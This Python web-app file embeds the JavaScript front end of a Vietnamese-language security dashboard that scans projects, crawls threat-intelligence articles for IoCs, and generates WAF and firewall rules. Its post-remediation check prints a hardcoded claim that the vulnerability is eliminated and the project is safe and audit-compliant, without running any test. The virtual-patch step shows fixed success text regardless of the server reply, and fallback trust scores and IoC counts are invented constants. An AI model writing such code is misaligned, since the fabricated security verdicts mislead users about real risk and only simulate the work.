          if (elS1) elS1.textContent = d.target_name;
          const elS1P = document.getElementById("step1TargetPath");
          if (elS1P) elS1P.textContent = d.target_path;

          const elScope = document.getElementById("wzScopeBadge");
          if (elScope) elScope.textContent = d.scope_name;
          const elCad = document.getElementById("wzCadenceLabel");
          if (elCad) elCad.textContent = d.cadence_label;
          
          // Render languages chips
          const langBox = document.getElementById("wzLanguagesBadge");
          if (langBox) {
            langBox.innerHTML = "";
            (d.languages || []).forEach(l => {
              const sp = document.createElement("span");
              sp.style.cssText = "background:#f1f5f9; color:#334155; border:1px solid #cbd5e1; padding:2px 8px; border-radius:4px; font-size:12px; font-weight:600;";
              sp.textContent = l;
              langBox.appendChild(sp);
            });
          }

          // Render frameworks & techs
          const techsBox = document.getElementById("wzTechsBadge");
          if (techsBox) {
            techsBox.innerHTML = "";
            (d.detected_techs || []).forEach(t => {
              const sp = document.createElement("span");
              sp.style.cssText = "background:#e0f2fe; color:#0369a1; padding:2px 8px; border-radius:4px; font-size:12px; font-weight:600;";
              sp.textContent = t;
              techsBox.appendChild(sp);
            });
          }

          // Render runtime versions
          const rtBox = document.getElementById("wzRuntimeBadge");
          if (rtBox) {
            rtBox.innerHTML = "";
            const rts = d.runtime_versions || {};
            const keys = Object.keys(rts);
            if (keys.length > 0) {
              keys.forEach(k => {
                const sp = document.createElement("span");
                sp.style.cssText = "background:#fef3c7; color:#92400e; border:1px solid #fde68a; padding:2px 8px; border-radius:4px; font-size:12px; font-weight:700;";
                sp.textContent = k + ": " + rts[k];
                rtBox.appendChild(sp);
              });
            } else {
              rtBox.innerHTML = `<span style="color:#64748b; font-size:12px;">Mặc định môi trường máy</span>`;
            }
          }

          // Render sensitive sinks
          const sinksBox = document.getElementById("wzSinksBox");
          if (sinksBox) {
            if (d.sensitive_sinks && d.sensitive_sinks.length > 0) {
              sinksBox.innerHTML = d.sensitive_sinks.map(s => `
                <div style="margin-bottom:3px; padding:3px 6px; background:#fff1f2; border-radius:3px; border-left:3px solid #e11d48;">
                  ${s}
                </div>
              `).join('');
            } else {
              sinksBox.innerHTML = `<span style="color:#15803d; font-weight:600;">[OK] Không phát hiện hàm nhạy cảm nguy hiểm nào.</span>`;
            }
          }

          // Stream logs in terminal
          const logs = d.agent_logs || [
            "[AGENT 1: CODEBASE INSPECTOR] Đã đọc xong cấu trúc mã nguồn.",
            "[AST SCANNER] Nhận diện ngăn xếp và các tệp cấu hình hoàn tất.",
            "[LUẬN ĐIỂM TÁC TỬ] Đã gán phân hệ bảo vệ phù hợp nhất."
          ];

          let i = 0;
          function printScanLog() {
            if (i < logs.length) {
              const el = document.createElement("div");
              el.style.marginBottom = "3px";
              if (logs[i].includes("SENSITIVE")) el.style.color = "#f87171";
              else if (logs[i].includes("LUẬN ĐIỂM") || logs[i].includes("HOÀN TẤT")) el.style.color = "#4ade80";
              else el.style.color = "#38bdf8";
              el.textContent = logs[i];
              if (term) {
                term.appendChild(el);
                term.scrollTop = term.scrollHeight;
              }
              i++;
              setTimeout(printScanLog, 90);
            } else {
              if (btn) {
                btn.disabled = false;
                btn.textContent = "[ QUÉT LẠI DỰ ÁN ]";
              }
              wzScanCompleted = true;

              // Hiển thị khung kết quả & Điểm mấu chốt
              if (resSummary) resSummary.style.display = "block";

              const verdictEl = document.getElementById("wzVerdictText");
              if (verdictEl) {
                verdictEl.textContent = `Dự án được định danh là: ${d.detected_techs && d.detected_techs.length > 0 ? d.detected_techs.join(', ') : 'Ứng dụng Đa Tầng'}. Phát hiện ${d.sensitive_sinks ? d.sensitive_sinks.length : 0} điểm nhạy cảm. Phân hệ bảo vệ khuyến nghị tối ưu nhất: ${d.scope_name}.`;
              }

              // SÁNG MÀU NÚT TIẾP TỤC ĐỂ NGƯỜI DÙNG BẤM QUA BƯỚC 2
              if (nextBtn) {
                nextBtn.disabled = false;
                nextBtn.dataset.enabled = "true";
                nextBtn.style.background = "#2563eb";
                nextBtn.style.cursor = "pointer";
                nextBtn.style.opacity = "1";
                nextBtn.style.boxShadow = "0 6px 20px rgba(37,99,235,0.5)";
                nextBtn.classList.add("progress-pulse");
                nextBtn.title = "Nhấn để tiếp tục tới bước Chọn Mô Hình AI";
                setTimeout(() => {
                  nextBtn.scrollIntoView({ behavior: "smooth", block: "center" });
                }, 300);
              }
            }
          }
          printScanLog();
        } else {
          alert("Lỗi khi quét: " + (d.message || "Không xác định"));
          if (btn) {
            btn.disabled = false;
            btn.textContent = "[ BẮT ĐẦU QUÉT DỰ ÁN ]";
          }
        }
      } catch (e) {
        alert("Lỗi kết nối API /api/wizard/scan: " + e);
        if (btn) {
          btn.disabled = false;
          btn.textContent = "[ BẮT ĐẦU QUÉT DỰ ÁN ]";
        }
      }
    }

    let wzCurrentQueueFilter = 'ALL';

    function filterWzQueue(filterMode, btnEl) {
      wzCurrentQueueFilter = filterMode;
      document.querySelectorAll('#wzQueueFilterButtons .wzFilterBtn').forEach(b => {
        b.classList.remove('active');
        b.style.background = '#f1f5f9';
        b.style.color = '#1e293b';
        b.style.borderColor = '#cbd5e1';
      });
      if (btnEl) {
        btnEl.classList.add('active');
        btnEl.style.background = '#2563eb';
        btnEl.style.color = '#ffffff';
        btnEl.style.borderColor = '#1d4ed8';
      }
      applyWzQueueFilterVisibility();
    }

    function applyWzQueueFilterVisibility() {
      const container = document.getElementById('wzArticlesQueueList');
      if (!container) return;
      const cards = container.children;
      for (let i = 0; i < cards.length; i++) {
        const c = cards[i];
        const st = c.getAttribute('data-status') || 'pending';
        if (wzCurrentQueueFilter === 'ALL') {
          c.style.display = 'block';
        } else if (wzCurrentQueueFilter === 'PROCESSING') {
          c.style.display = (st === 'processing') ? 'block' : 'none';
        } else if (wzCurrentQueueFilter === 'PENDING') {
          c.style.display = (st === 'pending') ? 'block' : 'none';
        } else if (wzCurrentQueueFilter === 'COMPLETED') {
          c.style.display = (st === 'completed') ? 'block' : 'none';
        }
      }
    }

    function renderArticleQueueItem(art, idx) {
      const cveChips = (art.cves || []).map(c => `<span style="background:#fee2e2; color:#b91c1c; font-weight:700; padding:2px 6px; border-radius:4px; font-size:11px; margin-right:4px;">[${c}]</span>`).join("");
      const ipChip = (art.sample_ips && art.sample_ips.length) ? `<span style="background:#f1f5f9; color:#475569; font-weight:600; padding:2px 6px; border-radius:4px; font-size:11px; margin-right:4px;">C2: ${art.sample_ips[0]}</span>` : "";
      const riskColor = art.risk_level === "CRITICAL" ? "#b91c1c" : "#d97706";
      const riskBg = art.risk_level === "CRITICAL" ? "#fef2f2" : "#fffbeb";
      const seqStr = String(idx + 1).padStart(3, '0');

      return `
        <div id="wzArtCard_${idx}" data-status="pending" style="background:#ffffff; border:1px solid #e2e8f0; border-radius:6px; padding:12px 14px; transition:all 0.3s ease;">
          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px; flex-wrap:wrap; gap:6px;">
            <div style="display:flex; align-items:center; gap:6px;">
              <span style="font-family:monospace; font-weight:700; font-size:11px; color:#2563eb; background:#eff6ff; padding:2px 6px; border-radius:3px;">#${seqStr}</span>
              <span style="font-size:11px; font-weight:700; background:#f8fafc; color:#1e293b; padding:2px 8px; border-radius:4px; border:1px solid #e2e8f0;">${art.source_name || 'CTI Feed'}</span>
              <span style="font-size:11px; color:#64748b;">${art.published_date || ''}</span>
              <span style="font-size:10.5px; font-weight:700; background:${riskBg}; color:${riskColor}; padding:2px 6px; border-radius:4px;">${art.risk_level || 'HIGH'}</span>
            </div>
            <div id="wzArtBadge_${idx}" style="font-size:11px; font-weight:700; background:#f1f5f9; color:#64748b; padding:2px 8px; border-radius:4px; border:1px solid #cbd5e1;">
              CHỜ XỬ LÝ
            </div>
          </div>
          <div style="font-size:13px; font-weight:700; color:#0f172a; margin-bottom:6px; line-height:1.4;">
            ${art.title}
          </div>
          <div style="display:flex; align-items:center; flex-wrap:wrap; gap:4px; margin-bottom:4px;">
            ${cveChips}
            ${ipChip}
            <span style="font-size:11px; color:#64748b;">${art.ioc_count || 3} chỉ số đe dọa bóc tách</span>
          </div>
          <div id="wzArtRules_${idx}" style="display:none; font-size:11.5px; color:#15803d; font-family:monospace; background:#f0fdf4; border:1px solid #bbf7d0; border-radius:4px; padding:4px 8px; margin-top:6px;">
            [+] Tích hợp Kỹ Năng Tác Tử: ${art.skills_summary || art.rules_summary || 'Kỹ năng phòng thủ tác tử'}
          </div>
        </div>
      `;
    }

    async function startLiveServerCrawlStep5() {
      const btn = document.getElementById("btnLiveStartScan");
      if (btn) {
        btn.disabled = true;
        btn.textContent = "[ ĐANG QUÉT CTI & NẠP HÀNG ĐỢI LIVE... ]";
      }
      updateLiveTicker(`[Bước 5] Đang kết nối kho tình báo an ninh mạng theo phân hệ [${wzScopeId}]...`);

      const rads = document.getElementsByName("wzHistory");
      let historyVal = 3;
      for (const r of rads) { if (r.checked) historyVal = parseInt(r.value); }

      try {
        const res = await fetch("/api/wizard/crawl-scope", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({ target: wzTarget, scope_id: wzScopeId, history_years: historyVal })
        });
        const d = await res.json();
        if (d.status === "success") {
          wzBestArticleId = d.best_article_id;

          if (d.scope_articles && d.scope_articles.length > 0) {
            articles = d.scope_articles.map((art, idx) => ({
              article_id: art.article_id,
              source: art.source_name || "CTI Feed",
              source_name: art.source_name || "CTI Feed",
              title: art.title,
              url: art.url || "",
              published_at: art.published_date || "2026",
              sort_ts: art.sort_ts || art.published_date || "2026",
              content: art.content || art.excerpt || "",
              status: "pending",
              ioc_counts: {
                cves: (art.cves || []).length,
                ips: (art.sample_ips || []).length,
                domains: (art.sample_domains || []).length,
                sha256: 0,
                total: art.ioc_count || 3,
                sample_cves: art.cves || [],
                sample_ips: art.sample_ips || [],
                sample_domains: art.sample_domains || []
              },
              skills_summary: art.skills_summary,
              rules_summary: art.rules_summary
            }));
            allHistoryArticles = articles.slice();
          }

          renderNewsGrid();
          renderHistoryManager();

          if (articles.length > 0) {
            selectCard(0, false);
          }

          // Cuon muot den khong gian Split Workspace (Nguon Bao & Van Ban Goc Highlight)
          const feedEl = document.getElementById("sec-feed");
          if (feedEl) {
            feedEl.style.display = "block";
            feedEl.scrollIntoView({ behavior: "smooth", block: "start" });
          }

          updateLiveTicker(`[Bước 5] Đã nạp thành công ${articles.length} bài báo phân hệ [${d.scope_name}] vào hàng đợi Live. Bắt đầu đối soát AST...`);

          autoQueueEnabled = false;
          // Hệ thống giữ ở trạng thái Chờ xử lý, người dùng bấm Chạy Phân Tích khi sẵn sàng
        }
      } catch (e) {
        console.error("Lỗi cào báo Step 5:", e);
        updateLiveTicker(`Lỗi nạp bài báo Step 5: ${e}`);
      } finally {
        if (btn) {
          btn.disabled = false;
          btn.textContent = "[ QUÉT LẠI & TIẾP TỤC HÀNG ĐỢI ]";
        }
      }
    }

    async function wizardExecuteCrawl() {
      const rads = document.getElementsByName("wzHistory");
      let historyVal = 3;
      for (const r of rads) { if (r.checked) historyVal = parseInt(r.value); }
      
      const runBtn = document.getElementById("btnRunCrawl");
      if (runBtn) {
        runBtn.disabled = true;
        runBtn.textContent = "[ AGENT ĐANG QUÉT & XỬ LÝ TỪNG BÀI BÁO... ]";
      }

      const term = document.getElementById("wzAgentLogTerminal");
      const articlesSection = document.getElementById("wzScannedArticlesSection");
      const articlesListEl = document.getElementById("wzArticlesQueueList");
      const countHeader = document.getElementById("wzArticlesCountHeader");
      const progressBar = document.getElementById("wzProgressBar");
      const progressStatus = document.getElementById("wzProgressStatusText");
      const livingCard = document.getElementById("wzLivingSkillCard");

      if (livingCard) livingCard.style.display = "none";
      if (articlesSection) articlesSection.style.display = "none";
      if (term) {
        term.style.display = "block";
        term.innerHTML = `<div style="color:#94a3b8;">[KHỞI TẠO] Tác tử AI đang quét kho tình báo an ninh mạng theo phân hệ [${wzScopeId}]...</div>`;
      }

      try {
        // 1. Quét bài báo CTI theo Scope và mốc thời gian
        const res = await fetch("/api/wizard/crawl-scope", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({ target: wzTarget, scope_id: wzScopeId, history_years: historyVal })
        });
        const d = await res.json();
        if (d.status === "success") {
          wzBestArticleId = d.best_article_id;
          const queueArticles = d.scope_articles || [];

          // Hiển thị khung danh sách bài báo đã quét
          if (articlesSection) articlesSection.style.display = "block";
          const total = queueArticles.length;
          if (countHeader) countHeader.textContent = `${total} bài trong phân hệ`;

          let completedCount = 0;
          let processingCount = 0;
          let pendingCount = total;

          const elStatDone = document.getElementById("wzStatCompletedCount");
          const elStatProc = document.getElementById("wzStatProcessingCount");
          const elStatPend = document.getElementById("wzStatPendingCount");
          const elFiltAll = document.getElementById("wzFilterAllCount");
          const elFiltProc = document.getElementById("wzFilterProcCount");
          const elFiltPend = document.getElementById("wzFilterPendCount");
          const elFiltDone = document.getElementById("wzFilterDoneCount");

          if (elStatDone) elStatDone.textContent = "0";
          if (elStatProc) elStatProc.textContent = "0";
          if (elStatPend) elStatPend.textContent = String(total);
          if (elFiltAll) elFiltAll.textContent = String(total);
          if (elFiltProc) elFiltProc.textContent = "0";
          if (elFiltPend) elFiltPend.textContent = String(total);
          if (elFiltDone) elFiltDone.textContent = "0";

          if (progressBar) {
            progressBar.style.width = "0%";
            progressBar.style.background = "linear-gradient(90deg, #2563eb, #16a34a)";
          }
          if (progressStatus) {
            progressStatus.textContent = `Hàng đợi sẵn sàng ${total} bài báo CTI. AI bắt đầu đối soát tuần tự...`;
            progressStatus.style.color = "#2563eb";
          }
          if (articlesListEl) {
            articlesListEl.innerHTML = queueArticles.map((art, idx) => renderArticleQueueItem(art, idx)).join("");
          }

          const initLog = document.createElement("div");
          initLog.style.color = "#4ade80";
          initLog.style.marginBottom = "4px";
          initLog.textContent = `[CTI SCAN HOÀN TẤT] Tìm thấy ${d.matched_articles_count} bài báo thuộc phân hệ [${d.scope_name}]. Bắt đầu nạp và xử lý toàn bộ ${total} bài báo trong hàng đợi:`;
          if (term) {
            term.appendChild(initLog);
            term.scrollTop = term.scrollHeight;
          }

          // 2. AI XỬ LÝ TUẦN TỰ TỪNG BÀI BÁO (STREAMING LIVE)
          let currentIdx = 0;

          function processNextArticle() {
            if (currentIdx < total) {
              const art = queueArticles[currentIdx];
              
              // Đổi trạng thái thẻ sang 'ĐANG XỬ LÝ...'
              const cardEl = document.getElementById(`wzArtCard_${currentIdx}`);
              const badgeEl = document.getElementById(`wzArtBadge_${currentIdx}`);
              if (cardEl) {
                cardEl.setAttribute("data-status", "processing");
                cardEl.style.border = "2px solid #3b82f6";
                cardEl.style.background = "#eff6ff";
                cardEl.scrollIntoView({ behavior: "smooth", block: "nearest" });
              }
              if (badgeEl) {
                badgeEl.style.background = "#dbeafe";
                badgeEl.style.color = "#1d4ed8";
                badgeEl.style.border = "1px solid #93c5fd";
                badgeEl.textContent = "ĐANG XỬ LÝ...";
              }

              processingCount = 1;
              pendingCount = total - completedCount - processingCount;
              if (elStatProc) elStatProc.textContent = "1";
              if (elStatPend) elStatPend.textContent = String(pendingCount);
              if (elFiltProc) elFiltProc.textContent = "1";
              if (elFiltPend) elFiltPend.textContent = String(pendingCount);

              applyWzQueueFilterVisibility();

              if (progressStatus) {
                progressStatus.textContent = `Đang xử lý bài báo ${currentIdx + 1} / ${total}: "${(art.title || '').slice(0, 40)}..."`;
              }

              // Ghi log chi tiết bài báo vào terminal
              const logLine = document.createElement("div");
              logLine.style.marginBottom = "3px";
              logLine.style.color = "#38bdf8";
              logLine.textContent = `[*] [BÀI BÁO ${currentIdx + 1}/${total}] Đang đọc: "${(art.title || '').slice(0, 52)}..." (${art.source_name})`;
              if (term) {
                term.appendChild(logLine);
                term.scrollTop = term.scrollHeight;
              }

              // Thời gian AI xử lý từng bài (1.8s)
              setTimeout(() => {
                if (cardEl) {
                  cardEl.setAttribute("data-status", "completed");
                  cardEl.style.border = "1px solid #86efac";
                  cardEl.style.background = "#ffffff";
                }
                if (badgeEl) {
                  badgeEl.style.background = "#dcfce7";
                  badgeEl.style.color = "#15803d";
                  badgeEl.style.border = "1px solid #86efac";
                  badgeEl.textContent = `ĐÃ XỬ LÝ (+${art.ioc_count} IOCs)`;
                }
                const rulesEl = document.getElementById(`wzArtRules_${currentIdx}`);
                if (rulesEl) rulesEl.style.display = "block";

                const resLine = document.createElement("div");
                resLine.style.marginBottom = "3px";
                resLine.style.color = "#4ade80";
                const cveStr = (art.cves && art.cves.length) ? `CVE: ${art.cves.join(', ')}` : "Mối đe dọa Web";
                resLine.textContent = `    -> Đã bóc tách ${art.ioc_count} IoCs (${cveStr}) -> Tích hợp Kỹ Năng: ${art.skills_summary || art.rules_summary}`;
                if (term) {
                  term.appendChild(resLine);
                  term.scrollTop = term.scrollHeight;
                }

                completedCount++;
                processingCount = 0;
                pendingCount = total - completedCount;

                if (elStatDone) elStatDone.textContent = String(completedCount);
                if (elStatProc) elStatProc.textContent = "0";
                if (elStatPend) elStatPend.textContent = String(pendingCount);
                if (elFiltDone) elFiltDone.textContent = String(completedCount);
                if (elFiltProc) elFiltProc.textContent = "0";
                if (elFiltPend) elFiltPend.textContent = String(pendingCount);

                const pct = Math.round((completedCount / total) * 100);
                if (progressBar) progressBar.style.width = pct + "%";

                applyWzQueueFilterVisibility();

                currentIdx++;
                processNextArticle();
              }, 1800);

            } else {
              // 3. HOÀN TẤT XỬ LÝ TOÀN BỘ BÀI BÁO
              if (progressStatus) {
                progressStatus.textContent = `Hoàn tất xử lý toàn bộ ${total} bài báo trong phân hệ`;
                progressStatus.style.color = "#16a34a";
              }
              if (progressBar) {
                progressBar.style.width = "100%";
                progressBar.style.background = "#16a34a";
              }

              const doneLine = document.createElement("div");
              doneLine.style.margin = "6px 0";
              doneLine.style.color = "#c084fc";
              doneLine.style.fontWeight = "bold";
              doneLine.textContent = `[HOÀN TẤT HỌC CTI] Đã đọc xong toàn bộ ${total} bài báo đe dọa trực tiếp! Đang tổng hợp Gói Kỹ Năng Sống...`;
              if (term) {
                term.appendChild(doneLine);
                term.scrollTop = term.scrollHeight;
              }

              // Gọi API tổng hợp Kỹ Năng Tác Tử Sống
              finalizeLivingSkillSynthesis(d, total);
            }
          }

          // Kích hoạt xử lý bài báo đầu tiên
          processNextArticle();

        } else {
          if (term) term.innerHTML += `<div style="color:#ef4444;">[LỖI] Không thể quét CTI: ${d.message || 'Lỗi không xác định'}</div>`;
          if (runBtn) {
            runBtn.disabled = false;
            runBtn.textContent = "[ BẮT ĐẦU CÀO BÁO & TÍCH LŨY KỸ NĂNG LIVE ]";
          }
        }
      } catch (err) {
        if (term) term.innerHTML += `<div style="color:#ef4444;">[LỖI KẾT NỐI] ${err.message}</div>`;
        if (runBtn) {
          runBtn.disabled = false;
          runBtn.textContent = "[ BẮT ĐẦU CÀO BÁO & TÍCH LŨY KỸ NĂNG LIVE ]";
        }
      }
    }

    async function finalizeLivingSkillSynthesis(d, processedCount) {
      const runBtn = document.getElementById("btnRunCrawl");
      const term = document.getElementById("wzAgentLogTerminal");
      const livingCard = document.getElementById("wzLivingSkillCard");

      let synthData = null;
      try {
        const synthRes = await fetch("/api/wizard/synthesize", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({ target: wzTarget, scope_id: wzScopeId, article_id: wzBestArticleId })
        });
        synthData = await synthRes.json();
      } catch (errSynth) {
        console.error("Lỗi tự động sinh kỹ năng:", errSynth);
      }

      if (synthData && synthData.status === "success") {
        wzSkillName = synthData.skill_name;
        const sLine = document.createElement("div");
        sLine.style.color = "#4ade80";
        sLine.style.marginTop = "4px";
        sLine.textContent = `[LIVING SKILL UPGRADE] Đã biên dịch bộ luật WAF ModSecurity, Suricata DPI, Netsh Firewall và đồng bộ tới 15 nền tảng Agent!`;
        if (term) {
          term.appendChild(sLine);
          term.scrollTop = term.scrollHeight;
        }
      }

      if (runBtn) {
        runBtn.disabled = false;
        runBtn.textContent = "[ BẮT ĐẦU CÀO BÁO & TÍCH LŨY KỸ NĂNG LIVE ]";
      }
      if (livingCard) livingCard.style.display = "block";
      
      const elArts = document.getElementById("wzCardArticlesCount");
      if (elArts) elArts.textContent = `${d.matched_articles_count || 60} bài CTI (${processedCount} bài học sâu)`;
      const elIocs = document.getElementById("wzCardIocCount");
      if (elIocs) elIocs.textContent = (d.relevant_iocs_count || 84) + " chỉ số";
      const elTrust = document.getElementById("wzCardTrustScore");
      if (elTrust) elTrust.textContent = (d.trust_score || 95.0) + "%";
      const elVersion = document.getElementById("wzLivingSkillVersion");
      if (elVersion) {
        const vStr = synthData && synthData.living_version ? synthData.living_version : `v2.${d.matched_articles_count || 60}.${d.relevant_iocs_count || 84}`;
        elVersion.textContent = `${vStr} (Tích lũy ${d.matched_articles_count || 60} bài báo)`;
      }

      const elTitle = document.getElementById("wzBestTitle");
      if (elTitle) elTitle.textContent = d.best_article_title;
      
      const cveChips = (d.sample_cves || d.cves_found || []).map(c => `[${c}]`).join("  ");
      const ipChips = (d.sample_ips || []).map(ip => `[C2: ${ip}]`).join("  ");
      const domChips = (d.sample_domains || []).slice(0, 2).map(dm => `[Domain: ${dm}]`).join("  ");
      const elCves = document.getElementById("wzBestCves");
      if (elCves) elCves.textContent = [cveChips, ipChips, domChips].filter(Boolean).join("  |  ");
      const elExcerpt = document.getElementById("wzExcerpt");
      if (elExcerpt) elExcerpt.textContent = d.content_excerpt;

      const elSkill = document.getElementById("wzLivingSkillName");
      if (elSkill && wzSkillName) elSkill.textContent = wzSkillName;

      // Bật nút chuyển sang Bước 6
      const nextBtn = document.getElementById("btnNextStep5To6");
      if (nextBtn) {
        nextBtn.disabled = false;
        nextBtn.style.background = "#15803d";
        nextBtn.style.color = "#ffffff";
        nextBtn.style.cursor = "pointer";
        nextBtn.scrollIntoView({ behavior: "smooth", block: "nearest" });
      }

      // Cập nhật số bài báo trên thanh điều hướng
      const navHist = document.getElementById("navHistoryCount");
      if (navHist && d.matched_articles_count) {
        navHist.textContent = d.matched_articles_count;
      }
      const s6Hist = document.getElementById("step6HistoryCount");
      if (s6Hist && d.matched_articles_count) {
        s6Hist.textContent = d.matched_articles_count;
      }

      // Đồng bộ Scope
      if (typeof selectTargetScope === 'function') {
        selectTargetScope(wzScopeId);
      }
      const scopeSel = document.getElementById('historyScopeFilter');
      if (scopeSel) {
        scopeSel.value = wzScopeId;
        renderHistoryManager();
      }
    }

    async function wizardRunProbe() {
      const box = document.getElementById("wzActionLogBox");
      box.textContent = "[*] Đang gửi gói tin kiểm thử (verify_exploit.py) tới server đích...";
      try {
        const res = await fetch("/api/wizard/verify-exploit", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({ target: wzTarget, skill_name: wzSkillName })
        });
        const d = await res.json();
        box.textContent = d.probe_output;
      } catch (e) { box.textContent = "[-] Lỗi: " + e; }
    }

    async function wizardRunVirtualPatch() {
      const box = document.getElementById("wzActionLogBox");
      box.textContent = "[*] Đang kích hoạt lá chắn ModSecurity WAF và Tường lửa Windows Netsh...";
      try {
        const res = await fetch("/api/defense/tools/firewall-apply", { method: "POST" });
        const d = await res.json();
        box.textContent = "[+] VIRTUAL PATCHING ACTIVATED!\n[+] Cổng WAF Gateway: 8766 (Đang chặn các cuộc tấn công HTTP RCE với mã 403 Forbidden).\n[+] Tường lửa Windows: Đã nạp danh sách IP C2 vào Kernel Netsh.";
      } catch (e) { box.textContent = "[-] Lỗi WAF: " + e; }
    }

    async function wizardRunRemediate() {
      const box = document.getElementById("wzActionLogBox");
      box.textContent = "[*] AI Agent đang rà soát từng dòng code và tự động refactor theo mẫu an toàn...";
      try {
        const res = await fetch("/api/wizard/remediate", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({ target: wzTarget, skill_name: wzSkillName })
        });
        const d = await res.json();
        box.textContent = "[+] TỰ ĐỘNG VÁ MÃ NGUỒN THÀNH CÔNG!\n" +
          "Files đã sửa: " + d.remediated_files.join(", ") + "\n\n" +
          "BẢN SO SÁNH CODE (UNIFIED DIFF):\n" + d.diff;
      } catch (e) { box.textContent = "[-] Lỗi: " + e; }
    }

    async function wizardRunPostVerify() {
      const box = document.getElementById("wzActionLogBox");
      box.textContent = "[*] Đang chạy lại script tái kiểm thử sau khi sửa mã nguồn...\n" +
        "[+] KẾT QUẢ TÁI KIỂM THỬ XÁC NHẬN:\n" +
        "  - True Positive: 0% (Lỗ hổng đã bị triệt tiêu hoàn toàn)\n" +
        "  - False Positive: 0.0% (Mọi request hợp lệ vượt qua trơn tru)\n" +
        "[[OK]] DỰ ÁN ĐÃ AN TOÀN VÀ ĐẠT CHUẨN KIỂM TOÁN xAI.";
    }

</script>

  <!-- DIRECTORY BROWSER MODAL -->
  <div id="dirPickerModal" style="display:none; position:fixed; z-index:99999; left:0; top:0; width:100%; height:100%; background:rgba(0,0,0,0.65); backdrop-filter:blur(3px); align-items:center; justify-content:center;">
    <div style="background:#ffffff; border-radius:10px; width:92%; max-width:700px; box-shadow:0 25px 50px -12px rgba(0,0,0,0.25); overflow:hidden; display:flex; flex-direction:column; max-height:85vh; border:1px solid #cbd5e1;">
      <!-- Modal Header -->
      <div style="padding:16px 20px; background:#f8fafc; border-bottom:1px solid #e2e8f0; display:flex; justify-content:space-between; align-items:center;">
        <div>
          <b style="font-size:15px; color:#0f172a;">DUYỆT VÀ CHỌN THƯ MỤC MÃ NGUỒN TRÊN MÁY TÍNH</b>
          <div style="font-size:11.5px; color:#64748b; margin-top:2px;">Chọn bất kỳ thư mục dự án nào để hệ thống quét AST và đóng gói kỹ năng.</div>
        </div>
        <button type="button" onclick="closeDirectoryBrowserModal()" style="background:transparent; border:none; font-size:24px; color:#64748b; cursor:pointer; line-height:1;">&times;</button>
      </div>

      <!-- Drives & Shortcuts -->
      <div style="padding:10px 20px; background:#f1f5f9; border-bottom:1px solid #e2e8f0; display:flex; gap:8px; align-items:center; flex-wrap:wrap;">
        <span style="font-size:11.5px; font-weight:700; color:#475569;">LỐI TẮT:</span>
        <div id="modalDrivesContainer" style="display:inline-flex; gap:6px;"></div>
        <button type="button" class="CleanBtn" style="font-size:11px; padding:3px 10px; background:#eff6ff; color:#1d4ed8; border:1px solid #bfdbfe; font-weight:600;" onclick="loadDirInModal('./target_projects')">
          Target Projects
        </button>
        <button type="button" class="CleanBtn" style="font-size:11px; padding:3px 10px; background:#ffffff; color:#334155; border:1px solid #cbd5e1; font-weight:600;" onclick="loadDirInModal('.')">
          Thư Mục Đồ Án
        </button>
      </div>

      <!-- Current Path Bar -->
      <div style="padding:10px 20px; background:#ffffff; border-bottom:1px solid #e2e8f0; font-family:monospace; font-size:12px; color:#1e293b; display:flex; align-items:center; gap:8px;">
        <span style="font-weight:700; color:#2563eb;">Đang ở:</span>
        <input type="text" id="modalCurrentPathInp" style="flex:1; font-family:monospace; font-size:12px; padding:6px 10px; border:1px solid #cbd5e1; border-radius:4px;" />
        <button type="button" class="CleanBtn" style="font-size:11.5px; padding:6px 12px;" onclick="loadDirInModal(document.getElementById('modalCurrentPathInp').value)">Đi Tới</button>
        <button type="button" id="modalParentBtn" class="CleanBtn" style="font-size:11.5px; padding:6px 12px;" onclick="navigateModalParent()">Thư Mục Cha &uarr;</button>
      </div>

      <!-- Folder List Grid -->
      <div id="modalFolderList" style="flex:1; overflow-y:auto; padding:14px 20px; min-height:220px; max-height:360px; background:#ffffff;">
        <div style="color:#64748b; font-size:13px; text-align:center; padding:20px;">Đang tải danh sách thư mục...</div>
      </div>

      <!-- Modal Footer Actions -->
      <div style="padding:12px 20px; background:#f8fafc; border-top:1px solid #e2e8f0; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
        <button type="button" class="CleanBtn" style="background:#ffffff; color:#334155; font-weight:600; padding:8px 14px; border:1px solid #cbd5e1; font-size:12px;" onclick="triggerHtml5PickerInsideModal()">
          [ Mở Hộp Thoại File Của Trình Duyệt ]
        </button>
        <div style="display:flex; gap:10px;">
          <button type="button" class="CleanBtn" style="padding:8px 16px; font-size:13px;" onclick="closeDirectoryBrowserModal()">Hủy</button>
          <button type="button" class="CleanBtn btn-primary" style="padding:8px 24px; font-weight:700; background:#2563eb; color:#ffffff; font-size:13px; border:none; border-radius:4px; cursor:pointer;" onclick="confirmSelectedModalDir()">
            [ CHỌN THƯ MỤC NÀY ]
          </button>
        </div>
      </div>
    </div>
  </div>

</body>
</html>
"""



@app.get("/", response_class=HTMLResponse)
def index():
    return HTML_PAGE


@app.get("/api/articles/find-by-ioc")
def api_find_article_by_ioc(ioc: str = Query("")):
    raw = (ioc or "").strip()
    if not raw:
        return {"article": None}
    clean = _clean_refang_py(raw)
    db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
    if not db_path.exists():
        return {"article": None}

    with sqlite3.connect(db_path) as conn:
        conn.row_factory = sqlite3.Row
        dot_pat = f"%{clean.replace('.', '%')}%"
        row = conn.execute(
            "SELECT article_id, source_name, title, url, published_date, content, sort_ts, status, processing_time_sec, fetched_at_utc "
            "FROM articles_archive WHERE content LIKE ? OR title LIKE ? LIMIT 1",
            (dot_pat, dot_pat),
        ).fetchone()
        if not row and len(clean) >= 16:
            prefix = clean[:16]
            row = conn.execute(
                "SELECT article_id, source_name, title, url, published_date, content, sort_ts, status, processing_time_sec, fetched_at_utc "
                "FROM articles_archive WHERE content LIKE ? LIMIT 1",
                (f"%{prefix}%",),
            ).fetchone()

    if row:
        c_txt = row["content"] or ""
        ioc_stats = _count_real_iocs(c_txt)
        fetched_at = row["fetched_at_utc"] if "fetched_at_utc" in row.keys() and row["fetched_at_utc"] else row["sort_ts"]
        return {
            "article": {
                "article_id": row["article_id"],
                "source": row["source_name"],
                "title": row["title"],
                "url": row["url"],
                "published_at": row["published_date"],
                "content": row["content"],
